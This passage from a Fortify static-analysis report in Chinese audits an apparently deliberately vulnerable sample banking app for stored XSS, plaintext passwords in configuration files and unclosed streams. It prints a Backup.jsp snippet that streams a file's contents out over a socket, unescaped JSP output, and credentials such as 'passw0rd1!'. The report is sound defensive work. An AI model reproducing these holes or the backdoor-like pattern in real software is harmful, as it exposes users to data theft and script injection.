在应用程序中确定针对 XSS 攻击执行验证的正确要点，以及验证过程中要考虑的特殊字符之后，下一个难点就是确定验证过程中处理各种特殊字符的方式。如果应用程序认定某些特殊字符为无效输入，那么您可以拒绝任何带有这些无效特殊字符的输入。第二种选择就是采用过滤手段来删除这些特殊字符。然而，过滤的负面作用在于，过滤内容的显示将发生改变。在需要完整显示输入内容的情况下，过滤的这种负面作用可能是无法接受的。

如果必须接受带有特殊字符的输入，并将其准确地显示出来，验证机制一定要对所有特殊字符进行编码，以便删除其具有的含义。官方的 HTML 规范 [2] 提供了特殊字符对应的 ISO 8859-1 编码值的完整列表。

许多应用程序服务器都试图避免应用程序出现 Cross-Site Scripting 漏洞，具体做法是为负责设置特定 HTTP 响应内容的函数提供各种实现方式，以检验是否存在进行 Cross-Site Scripting 攻击必需的字符。不要依赖运行应用程序的服务器，以此确保该应用程序的安全。开发了某个应用程序后，并不能保证在其生命周期中它会在哪些应用程序服务器中运行。由于标准和已知盗取方式的演变，我们不能保证应用程序服务器也会保持同步。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. Fortify 安全编码规则包将就 SQL Injection 和 Access Control 提出警告：当把不可信赖的数据写入数据库时，数据库将出现问题，并且会将数据库当作不可信赖的数据的来源，这会导致 XSS 漏洞。如果数据库在您的环境中是可信赖的资源，则使用自定义筛选器筛选出包含 DATABASE 污染标志或来自数据库源的数据流问题。尽管如此，对所有从数据库中读取的内容进行验证仍然是较好的做法。

2. 虽然使用 URL 对不可信数据进行编码可以防止许多 XSS 攻击，但部分浏览器（尤其是 Internet Explorer 6 和 7 以及其他浏览器）在将数据传递给 JavaScript 解释器之前，会自动在文档对象模型 (DOM) 中的特定位置对其内容进行解码。为了反映出其危险之处，规则包不再认为 URL 编码例程足以防御 cross-site scripting 攻击。如果对数据值进行 URL 编码并随后输出，Fortify 将会报告存在 Cross-Site Scripting: Poor Validation 漏洞。

3. Fortify RTA adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>7</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="8D528EEF40D1735CBEA279F7F0E0F8EC" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>hidden_AdminControl.jsp 中的方法 _jspService() 向第 134 行的 Web 浏览器发送非法数据，从而导致浏览器执行恶意代码。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>hidden_AdminControl.jsp</FileName>
                                <FilePath>pages/common/hidden_AdminControl.jsp</FilePath>
                                <LineStart>134</LineStart>
                                <Snippet>
				pageContext.getOut().flush();
				pageContext.getOut().println("&lt;pre&gt;"+transactionDescription+"&lt;/pre&gt;");
				}
		}</Snippet>
                                <TargetFunction>javax.servlet.jsp.JspWriter.println()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>TransactionService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/TransactionService.java</FilePath>
                                <LineStart>80</LineStart>
                                <Snippet>                ServletActionContext.getServletContext().log(queryStr);
            Query query = session.createQuery(queryStr);
            transactions = query.list();
        }
        finally{</Snippet>
                                <TargetFunction>net.sf.hibernate.Query.list()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B3B5F025479BF51A4FF4AC203E8D2BAD" ruleID="EE3BEEC1-F97C-4BB4-98D0-B9C9D9DF4B5E0">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>AccountResources.java 中的方法 GetAccounts() 向第 49 行的 Web 浏览器发送非法数据，从而导致浏览器执行恶意代码。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>AccountResources.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/restful/AccountResources.java</FilePath>
                                <LineStart>49</LineStart>
                                <Snippet>            List list = AccountService.getAllAccounts();
            if(list != null) {
                return XMLUtil.GetAccountsXML(list);
            }
</Snippet>
                                <TargetFunction>Return()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>56</LineStart>
                                <Snippet>            session = ConnectionFactory.getInstance().getSession();
            Criteria criteria = session.createCriteria(Account.class);
            return criteria.list();
        }
        catch(Exception e)</Snippet>
                                <TargetFunction>net.sf.hibernate.Criteria.list()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FF3253F3D9D5483C20ED03B0D7E1377C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewMessage.jsp 中的方法 _jspService() 向第 39 行的 Web 浏览器发送非法数据，从而导致浏览器执行恶意代码。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>ViewMessage.jsp</FileName>
                                <FilePath>pages/content/ViewMessage.jsp</FilePath>
                                <LineStart>39</LineStart>
                                <Snippet>						&lt;/c:if&gt;
						&lt;tr class="dataCell"&gt;
						    &lt;td colspan="2" align="left"&gt;&lt;textarea cols="125" readonly="readonly" rows="12" wrap="soft"&gt;&lt;c:out value="${body}" escapeXml="false"/&gt;&lt;/textarea&gt;&lt;/td&gt;
						&lt;/tr&gt;
				             &lt;/table&gt;</Snippet>
                                <TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>MessageService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/MessageService.java</FilePath>
                                <LineStart>71</LineStart>
                                <Snippet>        String queryStr = "from Message message where message.id = " + id;
        Query query = session.createQuery(queryStr);
        List messages = query.list();
        session.close();
		</Snippet>
                                <TargetFunction>net.sf.hibernate.Query.list()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="92319B67597E150084CE27397114E3DF" ruleID="EE3BEEC1-F97C-4BB4-98D0-B9C9D9DF4B5E0">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>AccountResources.java 中的方法 GetAccounts_JSON() 向第 33 行的 Web 浏览器发送非法数据，从而导致浏览器执行恶意代码。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>AccountResources.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/restful/AccountResources.java</FilePath>
                                <LineStart>33</LineStart>
                                <Snippet>            List list = AccountService.getAllAccounts();
            if(list != null) {
                return XMLUtil.GetAccountsJSON(list);
            }
</Snippet>
                                <TargetFunction>Return()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>56</LineStart>
                                <Snippet>            session = ConnectionFactory.getInstance().getSession();
            Criteria criteria = session.createCriteria(Account.class);
            return criteria.list();
        }
        catch(Exception e)</Snippet>
                                <TargetFunction>net.sf.hibernate.Criteria.list()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="261BC298644058440FEC02DEEC754B55" ruleID="7D4A0966-F236-4752-9781-FB13436BA9AD">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewMessage.jsp 中的方法 _jspService() 向第 35 行的 Web 浏览器发送非法数据，从而导致浏览器执行恶意代码。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>ViewMessage.jsp</FileName>
                                <FilePath>pages/content/ViewMessage.jsp</FilePath>
                                <LineStart>35</LineStart>
                                <Snippet>						&lt;tr class="dataCell" align="left"&gt;
						    &lt;td&gt;&amp;nbsp;Severity:&lt;/td&gt;
						    &lt;td&gt;&lt;c:out value="${severity}" escapeXml="false"/&gt;&lt;/td&gt;
						&lt;/tr&gt;
						&lt;/c:if&gt;	</Snippet>
                                <TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>MessageService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/MessageService.java</FilePath>
                                <LineStart>71</LineStart>
                                <Snippet>        String queryStr = "from Message message where message.id = " + id;
        Query query = session.createQuery(queryStr);
        List messages = query.list();
        session.close();
		</Snippet>
                                <TargetFunction>net.sf.hibernate.Query.list()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="6">
                        <groupTitle>Password Management: Password in Configuration File</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>在配置文件中存储明文密码，可能会危及系统安全。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>在配置文件中存储明文密码会使所有能够访问该文件的人都能访问那些用密码保护的资源。程序员有时候认为，他们不可能阻止应用程序被那些能够访问配置文件的攻击者入侵，但是这种想法会导致攻击者发动攻击变得更加容易。健全的 password management 方针从来不会允许以明文形式存储密码。

</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>绝不能采用明文的形式存储密码。应由管理员在系统启动时输入密码。如果这种方法不切实际，一个安全性较差、但通常都比较恰当的解决办法是将密码模糊化，并把这些去模糊化的资源分散到系统各处，因此，要破译密码，攻击者就必须取得并正确合并多个系统资源。

有些第三方产品宣称可以采用更加安全的方式管理密码。例如，WebSphere Application Server 4.x 用简单的异或加密算法加密数值，但是请不要对诸如此类的加密方式给予完全的信任。WebSphere 以及其他一些应用服务器通常都只提供过期的且相对较弱的加密机制，这对于安全性敏感的环境来说是远远不够的。较为安全的解决方法是由用户自己创建一个新机制，而这也是如今唯一可行的方法。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. Fortify Static Code Analyzer（Fortify 静态代码分析器）会从配置文件中搜索那些用于密码属性的常用名称。当发现密码条目中包含明文时，就会将其标记为问题。

2. 如果配置文件中包含一个默认密码条目，除了需要在配置文件中将其模糊化以外，还需要对其进行修改。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>6</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="5E877461B503A333A0A7F2B4E87B84A9" ruleID="29C589A2-3796-4486-A12D-BCE05ADFFE11">
                            <Category>Password Management: Password in Configuration File</Category>
                            <Folder>High</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>在配置文件中存储明文密码，可能会危及系统安全。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>jetty-realm.properties</FileName>
                                <FilePath>WEB-INF/jetty-realm.properties</FilePath>
                                <LineStart>8</LineStart>
                                <Snippet>usertablekey=ID
usertableuserfield=USERNAME
usertablepasswordfield=PASSWORD
roletable=AUTH
roletablekey=ROLEID</Snippet>
                                <TargetFunction>usertablepasswordfield()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8CD4982855B7D04F00F5A9CE18CF9DC3" ruleID="29C589A2-3796-4486-A12D-BCE05ADFFE11">
                            <Category>Password Management: Password in Configuration File</Category>
                            <Folder>High</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>在配置文件中存储明文密码，可能会危及系统安全。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>mailserver.legacy.properties</FileName>
                                <FilePath>config/mailserver.legacy.properties</FilePath>
                                <LineStart>7</LineStart>
                                <Snippet>riches.mail.username = test

riches.mail.password = passw0rd1!</Snippet>
                                <TargetFunction>riches.mail.password()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="249D9DBF189EBE890919CA37121116C7" ruleID="C09B4A17-F100-44a0-B315-6C7A39F01DA1">
                            <Category>Password Management: Password in Configuration File</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>在配置文件中存储明文密码，可能会危及系统安全。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>jetty-realm.properties</FileName>
                                <FilePath>WEB-INF/jetty-realm.properties</FilePath>
                                <LineStart>4</LineStart>
                                <Snippet>url=jdbc:hsqldb:res:/database/riches
username=sa
password=PASSWORD
usertable=PROFILE
usertablekey=ID</Snippet>
                                <TargetFunction>password()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C23D03273485F69A29A5E8B2B7038103" ruleID="26FA1D1C-C9AE-4D45-9D0D-2972534ECDCE">
                            <Category>Password Management: Password in Configuration File</Category>
                            <Folder>High</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>在配置文件中存储明文密码，可能会危及系统安全。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>build.xml</FileName>
                                <FilePath>build.xml</FilePath>
                                <LineStart>26</LineStart>
                                <Snippet>    &lt;property name="jdbc.driver" value="org.hsqldb.jdbcDriver"/&gt;
    &lt;property name="jdbc.username" value="sa"/&gt;
    &lt;property name="jdbc.password" value="PASSWORD"/&gt;

    &lt;property name="tomcat5.5.dir" location="${basedir}/etc/tomcat5.5-support"/&gt;</Snippet>
                                <TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C783526E9DAC395D9A598A91A554323A" ruleID="8FF9A602-1DDF-491F-B2D5-55A5B15C60C7">
                            <Category>Password Management: Password in Configuration File</Category>
                            <Folder>High</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>在配置文件中存储明文密码，可能会危及系统安全。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>riches-ds.xml</FileName>
                                <FilePath>etc/jboss4-support/riches-ds.xml</FilePath>
                                <LineStart>32</LineStart>
                                <Snippet>      &lt;!-- The login and password --&gt;
      &lt;user-name&gt;sa&lt;/user-name&gt;
      &lt;password&gt;PASSWORD&lt;/password&gt;

      &lt;!--example of how to specify class that determines if exception means connection should be destroyed--&gt;</Snippet>
                                <TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="6">
                        <groupTitle>Unreleased Resource: Streams</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>文件 Backup.jsp 中的函数 _jspService() 有时无法成功释放由第 8 行的 FileInputStream() 函数分配的系统资源。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>程序可能无法成功释放某一项系统资源。

资源泄露至少有两种常见的原因：

－ 错误状况及其他异常情况。

－ 未明确程序的哪一部份负责释放资源。

大部分 Unreleased Resource 问题只会导致常规软件可靠性问题，但如果攻击者能够故意触发资源泄漏，该攻击者就有可能通过耗尽资源池的方式发起 Denial of Service 攻击。

示例：下面的方法绝不会关闭它所打开的文件句柄。FileInputStream 中的 finalize() 方法最终会调用 close()，但是不能确定何时会调用 finalize() 方法。在繁忙的环境中，这会导致 JVM 用尽它所有的文件句柄。

private void processFile(String fName) throws FileNotFoundException, IOException {
  FileInputStream fis = new FileInputStream(fName);
  int sz;
  byte[] byteArray = new byte[BLOCK_SIZE];
  while ((sz = fis.read(byteArray)) != -1) {
    processBytes(byteArray, sz);
  }
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>1. 请不要依赖 finalize() 回收资源。为了使对象的 finalize() 方法能被调用，垃圾收集器必须确认对象符合垃圾回收的条件。但是垃圾收集器只有在 JVM 内存过小时才会使用。因此，无法保证何时能够调用该对象的 finalize() 方法。垃圾收集器最终运行时，可能出现这样的情况，即在短时间内回收大量的资源，这种情况会导致“突发”性能，并降低总体系统通过量。随着系统负载的增加，这种影响会越来越明显。

最后，如果某一资源回收操作被挂起（例如该操作需要通过网络访问数据库），那么执行 finalize() 方法的线程也将被挂起。

2. 在 finally 代码段中释放资源。示例中的代码可按以下方式改写：


public void processFile(String fName) throws FileNotFoundException, IOException {
  FileInputStream fis;
  try {
    fis = new FileInputStream(fName);
    int sz;
    byte[] byteArray = new byte[BLOCK_SIZE];
    while ((sz = fis.read(byteArray)) != -1) {
      processBytes(byteArray, sz);
    }
  }
  finally {
    if (fis != null) {
      safeClose(fis);
    }
  }
}

public static void safeClose(FileInputStream fis) {
  if (fis != null) {
    try {
      fis.close();
    } catch (IOException e) {
      log(e);
    }
  }
}


以上方案使用了一个助手函数，用以记录在尝试关闭流时可能发生的异常。该助手函数大约会在需要关闭流时重新使用。

此外，processFile 方法不会将 fis 对象初始化为 null，而是进行检查，以确保在调用 safeClose() 之前fis 不为 null。如果没有进行 null 检查，Java 编译器就会报告 fis 可能没有进行初始化。编译器做出这一判断源于 Java 可以检测未初始化的变量。如果用一种更加复杂的方法将 fis 初始化为 null，那么编译器就无法检测 fis 未经初始化便使用的情况。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>6</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="C059BA80170F1862AD796FA3BD53E949" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>文件 ConnectionFactory.java 中的函数 ConnectionFactory() 有时无法成功释放由第 28 行的 FileInputStream() 函数分配的系统资源。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>ConnectionFactory.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/ConnectionFactory.java</FilePath>
                                <LineStart>28</LineStart>
                                <Snippet>            {
                java.util.Properties props = new java.util.Properties();
                props.load( new java.io.FileInputStream(pFile) );
            }
        }</Snippet>
                                <TargetFunction>new FileInputStream(...)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E9F9DAB6A6D8A5F0243DE536F9A4537E" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>文件 SendMail.java 中的函数 &lt;static&gt;() 有时无法成功释放由第 23 行的 FileInputStream() 函数分配的系统资源。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>SendMail.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/legacy/mail/SendMail.java</FilePath>
                                <LineStart>23</LineStart>
                                <Snippet>			// Read properties file.
			Properties properties = new Properties();
			properties.load(new FileInputStream("mailserver.legacy.properties"));

			smtpServer = properties.getProperty("riches.mail.smptHostname");</Snippet>
                                <TargetFunction>new FileInputStream(...)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="01F60530B37664B38085F29BB102896D" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>文件 ConnFactory.java 中的函数 ConnFactory() 有时无法成功释放由第 20 行的 FileInputStream() 函数分配的系统资源。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>ConnFactory.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/ConnFactory.java</FilePath>
                                <LineStart>20</LineStart>
                                <Snippet>            {
                java.util.Properties props = new java.util.Properties();
                props.load( new java.io.FileInputStream(pFile) );
            }
            Context ctx = new InitialContext();</Snippet>
                                <TargetFunction>new FileInputStream(...)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="26D2D9556A2789EFCD43F5E592ADED74" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>文件 Backup.jsp 中的函数 _jspService() 有时无法成功释放由第 8 行的 FileInputStream() 函数分配的系统资源。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>Backup.jsp</FileName>
                                <FilePath>pages/Backup.jsp</FilePath>
                                <LineStart>9</LineStart>
                                <Snippet>    java.io.PrintWriter p_out = new java.io.PrintWriter(skt.getOutputStream(), true);
    java.io.FileInputStream fi = new java.io.FileInputStream(pf);
    java.io.BufferedReader r = new java.io.BufferedReader(new java.io.InputStreamReader(fi));
    String data;
    while ((data = r.readLine()) != null) {</Snippet>
                                <TargetFunction>r = new BufferedReader(new java.io.InputStreamReader())</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="32E949B42CD9930634D2173CEC7D335A" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>文件 BannerAdClient.java 中的函数 copy() 有时无法成功释放由第 37 行的 FileInputStream() 函数分配的系统资源。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>BannerAdClient.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/webservices/BannerAdClient.java</FilePath>
                                <LineStart>37</LineStart>
                                <Snippet>	private static void copy(File src, File dst) throws IOException {

        InputStream in = new FileInputStream(src);

        OutputStream out = new FileOutputStream(dst);</Snippet>
                                <TargetFunction>in = new FileInputStream(...)</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="5">
                        <groupTitle>Cross-Site Scripting: Poor Validation</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>career_details_error.jsp 中的 _jspService() 方法会使用 HTML、XML 或其他类型的编码，这种编码并不总是能够防止恶意代码访问 Web 浏览器。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>使用特定的编码构造，例如带有 escapeXml="true" 属性（默认设置）的 &lt;c:out/&gt; 标签可以避免一部分 cross-site scripting 攻击，但不能完全避免。根据数据出现的上下文，除 HTML 编码的基本字符 &lt;、&gt;、&amp; 和 " 以及 XML 编码的字符 &lt;、&gt;、&amp;、" 和 ' 之外，其他字符可能具有元意。依靠此类编码构造等同于用一个安全性较差的黑名单来防止 cross-site scripting 攻击，并且可能允许攻击者注入恶意代码，并在浏览器中加以执行。由于不可能始终准确地确定静态显示数据的上下文，所以即便进行了编码，Fortify Static Code Analyzer（Fortify 静态代码分析器）仍会报告跨站脚本攻击结果，并将其显示为 Cross-Site Scripting: Poor Validation 问题。

Cross-Site Scripting (XSS) 漏洞在以下情况下发生：

1. 数据通过一个不可信赖的数据源进入 Web 应用程序。对于 Reflected XSS，不可信赖的数据源大多数情况下为 Web 请求；而对于 Persistent（也称为 Stored）XSS，该数据源通常为数据库查询的结果。


2. 未检验包含在动态内容中的数据，便将其传送给了 Web 用户。

传送到 Web 浏览器的恶意内容通常采用 JavaScript 代码片段的形式，但也可能会包含一些 HTML、Flash 或者其他任意一种可以被浏览器执行的代码。基于 XSS 的攻击手段花样百出，几乎是无穷无尽的，但通常它们都会包含传输给攻击者的私有数据（如 Cookie 或者其他会话信息）。在攻击者的控制下，指引受害者进入恶意的网络内容；或者利用易受攻击的站点，对用户的机器进行其他恶意操作。


示例 1：以下 JSP 代码片段可从 HTTP 请求中读取雇员 ID eid，并通过 &lt;c:out/&gt; 标签将其显示给用户。


Employee ID: &lt;c:out value="${param.eid}"/&gt;



如果 eid 只包含标准的字母或数字文本，这个例子中的代码就能正确运行。如果 eid 里有包含元字符或源代码中的值，那么 Web 浏览器就会像显示 HTTP 响应那样执行代码。

起初，这个例子似乎是不会轻易遭受攻击的。毕竟，有谁会输入导致恶意代码在自己电脑上运行的 URL 呢？真正的危险在于攻击者会创建恶意的 URL，然后采用电子邮件或社交工程的欺骗手段诱使受害者访问此 URL 的链接。当受害者单击这个链接时，他们不知不觉地通过易受攻击的网络应用程序，将恶意内容带到了自己的电脑中。这种对易受攻击的 Web 应用程序进行盗取的机制通常被称为反射式 XSS。


示例 2：以下 JSP 代码片段可在数据库中查询具有给定 ID 的雇员，并通过 &lt;c:out/&gt; 标签输出相应雇员姓名。


&lt;%...
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
if (rs != null) {
   rs.next();
   String name = rs.getString("name");
}
%&gt;

Employee Name: &lt;c:out value="${name}"/&gt;




如同Example 1，如果对 name 的值处理得当，该代码就能正常地执行各种功能；如若处理不当，就会对代码的漏洞利用行为无能为力。同样，这段代码看起来似乎危险较小，因为 name 的值是从数据库中读取的，而且这些内容明显是由应用程序管理的。然而，如果 name 的值来自用户提供的数据，数据库就会成为恶意内容传播的通道。如果不对数据库中存储的所有数据进行恰当的输入验证，那么攻击者就可以在用户的 Web 浏览器中执行恶意命令。这种类型的漏洞利用称为 Persistent XSS（或 Stored XSS），它极其隐蔽，因为数据存储导致的间接行为会增大辨别威胁的难度，并使多个用户受此攻击影响的可能性提高。XSS 漏洞利用首先会在网站上为访问者提供一个“留言簿”。攻击者会在这些留言簿的条目中嵌入 JavaScript，接下来所有访问该留言簿页面的访问者都会执行这些恶意代码。

有些人认为在移动世界中，典型的 Web 应用程序漏洞（如 cross-site scripting）是无意义的 -- 为什么用户要攻击自己？但是，谨记移动平台的本质是从各种来源下载并在相同设备上运行的应用程序。恶意软件在银行应用程序附近运行的可能性很高，它们会强制扩展移动应用程序的攻击面（包括跨进程通信）。

示例 3：以下代码在 Android WebView 中启用了 JavaScript（默认情况下，JavaScript 为禁用状态），并根据从 Android Intent 接收到的值加载页面。


...
        WebView webview = (WebView) findViewById(R.id.webview);
        webview.getSettings().setJavaScriptEnabled(true);
        String url = this.getIntent().getExtras().getString("url");
        webview.loadUrl(URLEncoder.encode(url));
...


如果 url 的值以 javascript: 开头，则接下来的 JavaScript 代码将在 WebView 中的 Web 页面上下文内部执行。

正如例子中所显示的，XSS 漏洞是由于 HTTP 响应中包含了未经验证的数据代码而引起的。受害者遭受 XSS 攻击的途径有三种：

- 如Example 1 中所示，系统从 HTTP 请求中直接读取数据，并在 HTTP 响应中返回数据。当攻击者诱使用户为易受攻击的 Web 应用程序提供危险内容，而这些危险内容随后会反馈给用户并在 Web 浏览器中执行时，就会发生 Reflected XSS 漏洞利用。发送恶意内容最常用的方法是，将恶意内容作为一个参数包含在公开发布或通过电子邮件直接发送给受害者的 URL 中。以这种手段构造的 URL 已成为多种网络钓鱼阴谋的核心，攻击者会借此诱骗受害者访问指向易受攻击站点的 URL。当该站点将攻击者的内容反馈给受害者后，便会执行这些内容，接下来会将用户计算机中的各种私密信息（比如可能包含会话信息的 Cookie）传输给攻击者，或者执行其他恶意活动。

- 如Example 2 中所示，应用程序将危险数据存储在数据库或其他可信赖的数据存储中。这些危险数据随后会被读回到应用程序中，并包含在动态内容中。在以下情况下会发生 Persistent XSS 漏洞利用：攻击者将危险内容注入到数据存储中，而这些危险内容随后会被读取并包含在动态内容中。从攻击者的角度看，注入恶意内容的最佳位置莫过于显示给许多用户或显示给特定相关用户的区域。这些相关用户通常在应用程序中具备较高的特权，或者可以与敏感数据交互，这些数据对攻击者来说具有利用价值。如果某一个用户执行了恶意内容，攻击者就有可能以该用户的名义执行某些需要特权的操作，或者获得该用户个人敏感数据的访问权。

- 如Example 3 中所示，应用程序外部的源会将危险数据存储在数据库或其他数据存储中，随后这些危险数据会作为可信数据读回到应用程序并包含在动态内容中。


